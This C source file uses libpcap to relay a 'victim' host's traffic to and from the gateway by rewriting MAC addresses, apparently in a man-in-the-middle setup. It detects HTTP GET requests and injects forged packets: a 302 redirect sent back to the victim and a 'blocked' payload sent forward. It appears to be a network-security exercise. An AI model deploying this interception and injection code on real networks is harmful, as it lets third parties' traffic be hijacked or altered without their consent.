#include "myHeader.h"

int checkHttp(const u_char* packet) {
	PETHERNET_HEADER eth;
	PIP_HEADER ip;
	PTCP_HEADER tcp;
	/* ethernet header */
	eth = (PETHERNET_HEADER)packet;
	/* ip header */
	if (ntohs(eth->etherType) != ETHERTYPE_IP) return 0;
	ip = (PIP_HEADER)(packet + ETHERNET_HEADER_SIZE);
	/* tcp header */
	if (ntohs(ip->totalLen) <= IP_HEADER_SIZE + TCP_HEADER_SIZE || ip->protocol != IP_PROTOCOL_TCP) return 0;
	tcp = (PTCP_HEADER)(packet + ETHERNET_HEADER_SIZE + IP_HEADER_SIZE);
	/* tcp data */
	char* data = (char*)(packet + TCP_PACKET_SIZE);
	if (memcmp(data, "GET", 3)) return 0;
	return 1;
}


int packetRedirect(pcap_t* handle, struct pcap_pkthdr* pktHeader, const u_char* packet, PLANINFO LanInfo)
{
	PTCP_PACKET header;
	header = (PTCP_PACKET)packet;
	u_short ether_type = ntohs(header->ethernet.etherType);
	if (ether_type == IPV4)
	{
		if (checkVictim(&header->ethernet, LanInfo))
		{
			if (checkHttp(packet))
			{
				u_char sendPacket[1024] = { 0 };
				const char msgForward[8] = "blocked";
				const char msgBackward[128] = "HTTP/1.1 302 Found\r\nLocation: http://en.wikipedia.org/wiki/HTTP_302\r\n";
				u_short msgForwardLen = strlen(msgForward);
				u_short msgBackwardLen = strlen(msgBackward);
				packet_handlerForward(sendPacket, packet, msgBackward, msgBackwardLen, LanInfo);
				pcap_sendpacket(handle, sendPacket, 14 + 20 + 20 + msgBackwardLen);
				packet_handlerRedirect(sendPacket, packet, msgForward, msgForwardLen);
				pcap_sendpacket(handle, sendPacket, 14 + 20 + 20 + msgForwardLen);
			}
			else
			{
				/* send to router */
				memcpy(header->ethernet.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
				memcpy(header->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
				memcpy((char*)packet, header, pktHeader->len);
				if (pcap_sendpacket(handle, packet, pktHeader->len /* size */) != 0)
				{
					fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
					return 0;
				}
			}
		}
		else if (checkGateWay(&header->ethernet, LanInfo))
		{
			/* send to victim */
			memcpy(header->ethernet.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
			memcpy(header->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
			memcpy((char *)packet, header, pktHeader->len);
			if (pcap_sendpacket(handle, packet, pktHeader->len /* size */) != 0)
			{
				fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
				return 0;
			}
		}
		else
			return 0;
	}
	return 0;
}